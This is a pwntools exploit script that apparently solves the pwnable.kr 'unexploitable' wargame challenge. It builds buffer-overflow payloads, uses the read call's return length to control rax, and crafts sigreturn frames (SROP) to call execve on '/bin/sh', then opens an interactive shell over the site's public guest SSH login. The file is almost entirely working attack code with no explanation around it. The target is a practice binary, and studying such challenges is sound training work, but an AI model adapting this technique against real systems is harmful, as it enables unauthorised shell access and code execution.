#!/usr/bin/env python3

from pwn import *

exe = ELF("./unexploitable")

context.binary = exe

RT_SIGRETURN = 15
SYS_EXECVE = 59
BSS = 0x0601028
SYSCALL = 0x0000000000400560

BIN_SH_ADDR = 0x6019d0

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="b *0x400577\nc")
    else:
        s = ssh(
                user = "unexploitable", 
                host = "pwnable.kr", 
                port = 2222, 
                password = "guest"
            )
        r = s.process('/home/unexploitable/unexploitable')


    return r


def main():
    r = conn()

    payload1 = b""
    payload1 += b'A' * 0x18
    payload1 += p64(exe.sym.main) # use main to set rax to whatever we want - read sets rax to length of bytes read
    payload1 += p64(SYSCALL)


    payload2 = b"A" * (RT_SIGRETURN - 1) # minus one because newline also counts

    sr_frame = SigreturnFrame()

    sr_frame.rsp = 0x601800
    sr_frame.rip = exe.sym.main

    payload1 += bytes(sr_frame)

    payload3 = b'' 
    payload3 += cyclic(0x18) 
    payload3 += p64(exe.sym.main) # use main to set rax to whatever we want - read sets rax to length of bytes read
    payload3 += p64(SYSCALL)


    sr_frame = SigreturnFrame()

    sr_frame.rsp = 0x601800
    sr_frame.rdi = BIN_SH_ADDR
    sr_frame.rax = SYS_EXECVE
    sr_frame.rip = SYSCALL

    payload3 += bytes(sr_frame)

    payload3 += cyclic(200)
    payload3 += b"/bin/sh\x00"


    r.sendline(payload1)
    sleep(4)
    r.sendline(payload2)
    
    
    sleep(4)
    r.sendline(payload3)
    sleep(4)
    r.sendline(payload2)
    


    r.interactive()


if __name__ == "__main__":
    main()
